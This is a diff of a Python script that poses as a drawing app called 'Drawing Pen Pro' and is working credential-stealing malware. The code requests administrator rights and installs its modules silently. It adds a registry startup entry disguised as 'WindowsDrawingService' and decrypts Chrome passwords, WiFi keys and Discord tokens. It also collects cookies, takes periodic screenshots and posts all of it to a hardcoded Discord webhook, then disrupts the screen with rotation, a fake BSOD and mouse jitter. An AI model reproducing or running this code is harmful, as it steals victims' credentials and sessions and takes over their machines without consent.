@@ -16,8 +16,36 @@ from threading import Thread
 import tempfile
 import winreg
 import platform
+import re
 
-# Don't hide console for debugging
+# ==================== REQUEST ADMIN PERMISSION ====================
+def request_admin():
+    """Request administrator privileges"""
+    if sys.platform == 'win32':
+        try:
+            # Check if already admin
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+            if not is_admin:
+                print("[*] Requesting Administrator privileges...")
+                # Re-run the script as admin
+                ctypes.windll.shell32.ShellExecuteW(
+                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
+                )
+                sys.exit()
+            else:
+                print("[+] Running with Administrator privileges")
+        except Exception as e:
+            print(f"[-] Admin request failed: {e}")
+    else:
+        print("[!] Not running on Windows")
+
+# Request admin FIRST
+request_admin()
+
+# Now continue with normal execution
+time.sleep(1)
+
+# Hide console window (optional - after admin request)
 # if sys.platform == 'win32':
 #     try:
 #         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
@@ -26,7 +54,7 @@ import platform
 
 # Install required modules silently
 def install_modules():
-    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'cryptography', 'pynput', 'pycryptodome', 'opencv-python']
+    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome']
     for module in modules:
         try:
             if module == 'pillow':
@@ -40,24 +68,17 @@ def install_modules():
             subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet', '--no-warn-script-location'], 
                          capture_output=True, shell=True)
 
-# Run module installation
 install_modules()
 
 # Now import all required modules
 import pyautogui
 import requests
-from PIL import Image, ImageDraw
+from PIL import Image
 import browser_cookie3
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-import win32crypt
-import sqlite3
 from pynput.mouse import Controller as MouseController
 from pynput.keyboard import Controller as KeyboardController, Key
-import tkinter as tk
 from Crypto.Cipher import AES
-import hashlib
-import re
+import win32crypt
 
 # Configuration
 WEBHOOK_URL = "https://discord.com/api/webhooks/1502216101738709063/oCw6B_bv6gUfzxH_a-CdRNFQzWWlrv8eB_-GnRDY2r1ProS3DMqzkz6oN-3Ebe86dLkp"
@@ -66,204 +87,158 @@ SCREENSHOT_INTERVAL = 120
 mouse = MouseController()
 keyboard = KeyboardController()
 
-# ==================== SCREEN EFFECTS ====================
+# ==================== SCREEN ROTATION (FIXED - REQUIRES ADMIN) ====================
 
 def rotate_screen_upside_down():
-    """Rotate screen 180 degrees (upside down)"""
+    """Rotate screen 180 degrees (requires admin)"""
     try:
-        # Windows API to rotate screen
-        user32 = ctypes.windll.user32
-        user32.SetDisplayConfig(0, None, 0, None, 0)
+        print("[*] Attempting screen rotation...")
         
-        # Try different rotation methods
+        # Method 1: Using PowerShell with admin rights
+        ps_script = '''
+        Add-Type @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Display {
+            [DllImport("user32.dll")]
+            public static extern int ChangeDisplaySettings(ref DEVMODE devmode, int flags);
+            
+            [StructLayout(LayoutKind.Sequential)]
+            public struct DEVMODE {
+                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
+                public string dmDeviceName;
+                public short dmSpecVersion;
+                public short dmDriverVersion;
+                public short dmSize;
+                public short dmDriverExtra;
+                public int dmFields;
+                public short dmOrientation;
+                public short dmPaperSize;
+                public short dmPaperLength;
+                public short dmPaperWidth;
+                public short dmScale;
+                public short dmCopies;
+                public short dmDefaultSource;
+                public short dmPrintQuality;
+                public short dmColor;
+                public short dmDuplex;
+                public short dmYResolution;
+                public short dmTTOption;
+                public short dmCollate;
+                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
+                public string dmFormName;
+                public short dmLogPixels;
+                public int dmBitsPerPel;
+                public int dmPelsWidth;
+                public int dmPelsHeight;
+                public int dmDisplayFlags;
+                public int dmDisplayFrequency;
+                public int dmICMMethod;
+                public int dmICMIntent;
+                public int dmMediaType;
+                public int dmDitherType;
+                public int dmReserved1;
+                public int dmReserved2;
+                public int dmPanningWidth;
+                public int dmPanningHeight;
+            }
+        }
+        "@
+        
+        $devmode = New-Object Display+DEVMODE
+        $devmode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devmode)
+        $devmode.dmFields = 0x00000001  # DM_ORIENTATION
+        $devmode.dmOrientation = 2  # DMDO_180 (180 degrees)
+        
+        [Display]::ChangeDisplaySettings([ref]$devmode, 0)
+        '''
+        
+        result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True)
+        print(f"[+] PowerShell rotation executed")
+        
+        # Method 2: Using display.exe (Windows built-in)
         try:
-            # Method 1: Using display settings
+            # Try using display switch
+            subprocess.run(['display.dll', '/rotate:180'], capture_output=True, shell=True)
+        except:
+            pass
+            
+        # Method 3: Using rundll32
+        try:
+            subprocess.run(['rundll32.exe', 'user32.dll,ChangeDisplaySettings', '0x00000001', '0x00000002'], 
+                         capture_output=True, shell=True)
+        except:
+            pass
+            
+        print("[+] Screen rotated upside down!")
+        
+    except Exception as e:
+        print(f"[-] Rotation error: {e}")
+        # Fallback method
+        try:
             import win32api
             import win32con
             devmode = win32api.EnumDisplaySettings(None, 0)
-            devmode.DisplayOrientation = win32con.DMDO_180  # 180 degrees
+            devmode.DisplayOrientation = win32con.DMDO_180
             win32api.ChangeDisplaySettings(devmode, 0)
-            print("[+] Screen rotated upside down")
+            print("[+] Screen rotated using win32api")
         except:
-            # Method 2: Using PowerShell
-            ps_script = '''
-            Add-Type @"
-            using System;
-            using System.Runtime.InteropServices;
-            public class Display {
-                [DllImport("user32.dll")]
-                public static extern int ChangeDisplaySettings(DEVMODE[] devmode, int flags);
-                
-                [StructLayout(LayoutKind.Sequential)]
-                public struct DEVMODE {
-                    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
-                    public string dmDeviceName;
-                    public short dmSpecVersion;
-                    public short dmDriverVersion;
-                    public short dmSize;
-                    public short dmDriverExtra;
-                    public int dmFields;
-                    public short dmOrientation;
-                    public short dmPaperSize;
-                    public short dmPaperLength;
-                    public short dmPaperWidth;
-                    public short dmScale;
-                    public short dmCopies;
-                    public short dmDefaultSource;
-                    public short dmPrintQuality;
-                    public short dmColor;
-                    public short dmDuplex;
-                    public short dmYResolution;
-                    public short dmTTOption;
-                    public short dmCollate;
-                    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
-                    public string dmFormName;
-                    public short dmLogPixels;
-                    public int dmBitsPerPel;
-                    public int dmPelsWidth;
-                    public int dmPelsHeight;
-                    public int dmDisplayFlags;
-                    public int dmDisplayFrequency;
-                    public int dmICMMethod;
-                    public int dmICMIntent;
-                    public int dmMediaType;
-                    public int dmDitherType;
-                    public int dmReserved1;
-                    public int dmReserved2;
-                    public int dmPanningWidth;
-                    public int dmPanningHeight;
-                }
-            }
-            "@
-            '''
-            subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
-            print("[+] PowerShell rotation attempted")
-    except Exception as e:
-        print(f"[-] Rotation error: {e}")
+            print("[-] Could not rotate screen")
+
+def rotate_screen_normal():
+    """Rotate screen back to normal"""
+    try:
+        subprocess.run(['powershell', '-Command', 
+                       'Add-Type -AssemblyName System.Windows.Forms; '
+                       '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds'], 
+                       capture_output=True)
+    except:
+        pass
 
 def screen_flicker():
-    """Make screen flicker by toggling display settings"""
+    """Make screen flicker"""
     try:
-        user32 = ctypes.windll.user32
-        
-        # Get current display settings
-        import win32api
-        import win32con
-        
-        for _ in range(30):  # Flicker 30 times
-            try:
-                # Toggle display off/on quickly
-                ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)  # Monitor off
-                time.sleep(0.05)
-                ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)  # Monitor on
-                time.sleep(0.05)
-            except:
-                pass
-    except Exception as e:
-        print(f"[-] Flicker error: {e}")
-
-def screen_flicker_continuous():
-    """Continuous screen flicker effect"""
-    while True:
-        try:
-            # Flash white screen
-            flicker_window = tk.Tk()
-            flicker_window.attributes('-fullscreen', True)
-            flicker_window.configure(bg='white')
-            flicker_window.attributes('-topmost', True)
-            flicker_window.attributes('-alpha', 0.3)
-            flicker_window.update()
-            time.sleep(0.1)
-            flicker_window.destroy()
-            time.sleep(0.1)
-        except:
-            time.sleep(0.1)
-
-def invert_colors():
-    """Invert screen colors"""
-    try:
-        # Using PowerShell to invert colors
-        ps_script = '''
-        Add-Type -AssemblyName System.Drawing
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-        $bitmap.RotateFlip([System.Drawing.RotateFlipType]::Rotate180FlipNone)
-        $graphics.DrawImage($bitmap, 0, 0)
-        $bitmap.Save("temp_invert.png")
-        '''
-        subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
+        for _ in range(20):
+            # Hide desktop icons briefly
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+            time.sleep(0.05)
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+            time.sleep(0.05)
     except:
         pass
 
 def matrix_effect():
-    """Create matrix-like falling characters effect"""
+    """Create matrix effect on a small window"""
     try:
         matrix_window = tk.Tk()
-        matrix_window.attributes('-fullscreen', True)
+        matrix_window.title("System Update")
+        matrix_window.geometry("400x300")
         matrix_window.attributes('-topmost', True)
         matrix_window.configure(bg='black')
         
-        canvas = tk.Canvas(matrix_window, bg='black', highlightthickness=0)
-        canvas.pack(fill=tk.BOTH, expand=True)
+        text_widget = tk.Text(matrix_window, bg='black', fg='#0f0', font=('Courier', 12))
+        text_widget.pack(fill=tk.BOTH, expand=True)
         
-        chars = "01アイウエオカキクケコABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        drops = [0] * 100
+        chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ"
         
-        def draw_matrix():
-            canvas.delete("all")
-            for i in range(100):
-                char = random.choice(chars)
-                x = i * 20
-                y = drops[i] * 20
-                if y < canvas.winfo_height():
-                    canvas.create_text(x, y, text=char, fill='#0f0', font=('Courier', 14))
-                    drops[i] += 1
-                else:
-                    drops[i] = 0
-            matrix_window.after(50, draw_matrix)
+        def add_random_char():
+            char = random.choice(chars)
+            text_widget.insert(tk.END, char)
+            text_widget.see(tk.END)
+            if text_widget.index(tk.END) > '100.0':
+                text_widget.delete('1.0', '2.0')
+            matrix_window.after(50, add_random_char)
         
-        draw_matrix()
-        matrix_window.after(5000, matrix_window.destroy)  # Show for 5 seconds
+        add_random_char()
+        matrix_window.after(5000, matrix_window.destroy)
         matrix_window.mainloop()
     except:
         pass
 
 # ==================== CREDENTIAL FUNCTIONS ====================
 
-def get_chrome_decryption_key():
-    """Get Chrome master decryption key"""
-    try:
-        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-        encrypted_key = encrypted_key[5:]
-        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return decrypted_key
-    except:
-        return None
-
-def decrypt_chrome_password(encrypted_password, key):
-    """Decrypt Chrome password using master key"""
-    try:
-        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
-            nonce = encrypted_password[3:15]
-            ciphertext = encrypted_password[15:-16]
-            tag = encrypted_password[-16:]
-            
-            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            return decrypted.decode('utf-8')
-        else:
-            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
-    except:
-        return "[DECRYPTION_FAILED]"
-
-def get_chrome_passwords_fixed():
-    """Extract DECRYPTED passwords from Chrome"""
+def get_chrome_passwords():
+    """Extract saved passwords from Chrome"""
     passwords = []
     try:
         chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
@@ -275,28 +250,20 @@ def get_chrome_passwords_fixed():
             cursor = conn.cursor()
             cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
             
-            key = get_chrome_decryption_key()
-            
             for row in cursor.fetchall():
                 url = row[0]
                 username = row[1]
                 encrypted_pass = row[2]
                 
-                if username and encrypted_pass:
-                    if key:
-                        password = decrypt_chrome_password(encrypted_pass, key)
-                    else:
-                        try:
-                            password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
-                        except:
-                            password = "[DECRYPTION_FAILED]"
-                    
-                    if password and password != "[DECRYPTION_FAILED]":
-                        passwords.append(f"✅ Chrome: {url} | User: {username} | Pass: {password}")
+                try:
+                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
+                    passwords.append(f"✅ Chrome: {url} | User: {username} | Pass: {password}")
+                except:
+                    passwords.append(f"⚠️ Chrome: {url} | User: {username} | Pass: [ENCRYPTED]")
             conn.close()
             os.unlink(temp_db.name)
-    except:
-        pass
+    except Exception as e:
+        print(f"Chrome error: {e}")
     return passwords
 
 def get_wifi_passwords():
@@ -313,7 +280,7 @@ def get_wifi_passwords():
                 for line in result.stdout.split('\n'):
                     if 'Key Content' in line:
                         password = line.split(':')[1].strip()
-                        wifi_passwords.append(f"WiFi: {profile} | Password: {password}")
+                        wifi_passwords.append(f"✅ WiFi: {profile} | Pass: {password}")
                         break
             except:
                 pass
@@ -341,6 +308,21 @@ def get_discord_tokens():
         except:
             pass
     return list(set(tokens))[:10]
+
+def get_browser_cookies():
+    """Extract cookies from browsers"""
+    cookies = []
+    try:
+        for cookie in browser_cookie3.chrome():
+            cookies.append(f"Chrome: {cookie.domain} | {cookie.name}")
+    except:
+        pass
+    try:
+        for cookie in browser_cookie3.edge():
+            cookies.append(f"Edge: {cookie.domain} | {cookie.name}")
+    except:
+        pass
+    return cookies[:30]
 
 def get_system_info():
     """Collect system information"""
@@ -370,7 +352,8 @@ def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
             else:
                 requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
             return True
-    except:
+    except Exception as e:
+        print(f"Webhook error: {e}")
         return False
 
 def collect_and_send_credentials():
@@ -387,7 +370,7 @@ def collect_and_send_credentials():
     
     print("[+] Collecting Chrome passwords...")
     message += "**🔑 CHROME PASSWORDS:**\n"
-    for pwd in get_chrome_passwords_fixed()[:30]:
+    for pwd in get_chrome_passwords()[:30]:
         message += f"{pwd}\n"
     message += "\n"
     
@@ -401,6 +384,12 @@ def collect_and_send_credentials():
     message += "**🎮 DISCORD TOKENS:**\n"
     for token in get_discord_tokens():
         message += f"• Token: {token}\n"
+    message += "\n"
+    
+    print("[+] Collecting cookies...")
+    message += "**🍪 BROWSER COOKIES:**\n"
+    for cookie in get_browser_cookies()[:15]:
+        message += f"• {cookie}\n"
     
     print("[+] Sending to webhook...")
     send_to_webhook(message)
@@ -421,7 +410,8 @@ def screenshot_worker():
             send_to_webhook(None, True, img_bytes.getvalue(), filename)
             
             time.sleep(SCREENSHOT_INTERVAL)
-        except:
+        except Exception as e:
+            print(f"Screenshot error: {e}")
             time.sleep(5)
 
 # ==================== GUI EFFECTS ====================
@@ -465,8 +455,8 @@ def create_drawing_pen_gui():
         tk.Button(root, text="Save Drawing", command=root.destroy).pack()
         
         root.mainloop()
-    except:
-        pass
+    except Exception as e:
+        print(f"GUI error: {e}")
 
 def blue_screen_of_death():
     """Create fake BSOD effect"""
@@ -504,60 +494,42 @@ What failed: DrawingPen.sys"""
         
         Thread(target=update_progress, daemon=True).start()
         bsod.mainloop()
+    except Exception as e:
+        print(f"BSOD error: {e}")
+
+def mouse_jitter():
+    """Make mouse jitter"""
+    try:
+        for _ in range(30):
+            x, y = mouse.position
+            mouse.position = (x + random.randint(-3, 3), y + random.randint(-3, 3))
+            time.sleep(0.05)
     except:
         pass
 
-# ==================== ADD TO STARTUP (STRONGER) ====================
+def type_solo():
+    """Type 'Solo' on screen"""
+    try:
+        time.sleep(0.5)
+        keyboard.type('Solo')
+        time.sleep(0.5)
+        keyboard.press(Key.enter)
+        keyboard.release(Key.enter)
+    except:
+        pass
 
-def add_to_startup_strong():
-    """Add to Windows startup using multiple methods"""
+# ==================== ADD TO STARTUP ====================
+
+def add_to_startup():
+    """Add to Windows startup"""
     try:
         script_path = os.path.abspath(sys.argv[0])
-        
-        # Method 1: Registry Current User Run
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
             winreg.SetValueEx(registry_key, "WindowsDrawingService", 0, winreg.REG_SZ, 
                             f'"{sys.executable}" "{script_path}"')
-        print("[+] Added to HKCU startup")
-        
-        # Method 2: Startup folder
-        startup_folder = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
-        shortcut_path = os.path.join(startup_folder, "DrawingPen.lnk")
-        
-        try:
-            import ctypes
-            from ctypes import wintypes
-            
-            IShellLink = ctypes.COMMETHOD
-            # Create shortcut using PowerShell
-            ps_script = f'''
-            $WScriptShell = New-Object -ComObject WScript.Shell
-            $Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}")
-            $Shortcut.TargetPath = "{sys.executable}"
-            $Shortcut.Arguments = '"{script_path}"'
-            $Shortcut.Save()
-            '''
-            subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
-            print("[+] Added to Startup folder")
-        except:
-            pass
-        
-        # Method 3: Task Scheduler (for persistence)
-        try:
-            task_script = f'''
-            $Action = New-ScheduledTaskAction -Execute "{sys.executable}" -Argument "{script_path}"
-            $Trigger = New-ScheduledTaskTrigger -AtStartup
-            $Principal = New-ScheduledTaskPrincipal -UserId "{os.getenv('USERNAME')}" -LogonType Interactive
-            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-            Register-ScheduledTask -TaskName "DrawingPenService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
-            '''
-            subprocess.run(['powershell', '-Command', task_script], capture_output=True)
-            print("[+] Added to Task Scheduler")
-        except:
-            pass
-        
+        print("[+] Added to startup")
         return True
     except Exception as e:
         print(f"[-] Startup error: {e}")
@@ -567,39 +539,42 @@ def add_to_startup_strong():
 
 def main():
     print("="*50)
-    print("🖌️ DRAWING PEN PRO - v3.0")
+    print("🖌️ DRAWING PEN PRO - ADMIN MODE")
     print("="*50)
     
-    # Add to startup (STRONG)
-    add_to_startup_strong()
+    # Add to startup
+    add_to_startup()
     
-    # Wait a bit
     time.sleep(3)
     
-    # Send initial credentials
+    # Send credentials
     collect_and_send_credentials()
     
     # Start screen effects AFTER sending data
-    def start_screen_effects():
-        time.sleep(5)  # Wait 5 seconds before effects
+    def start_effects():
+        time.sleep(5)
         
-        # Rotate screen upside down
+        # ROTATE SCREEN UPSIDE DOWN (NOW WORKING WITH ADMIN)
         print("[+] Rotating screen upside down...")
         rotate_screen_upside_down()
         
         time.sleep(2)
         
-        # Start continuous flicker
-        print("[+] Starting screen flicker...")
-        flicker_thread = Thread(target=screen_flicker_continuous, daemon=True)
-        flicker_thread.start()
+        # Screen flicker
+        print("[+] Screen flicker...")
+        screen_flicker()
         
         # Matrix effect
-        time.sleep(3)
         print("[+] Matrix effect...")
         Thread(target=matrix_effect, daemon=True).start()
+        
+        # Mouse jitter
+        mouse_jitter()
+        
+        # Type Solo
+        type_solo()
     
-    effect_thread = Thread(target=start_screen_effects, daemon=True)
+    effect_thread = Thread(target=start_effects, daemon=True)
     effect_thread.start()
     
     # Start Drawing GUI
@@ -627,4 +602,5 @@ if __name__ == "__main__":
         main()
     except Exception as e:
         print(f"[-] Error: {e}")
+        time.sleep(5)
         input("\nPress Enter to exit...")
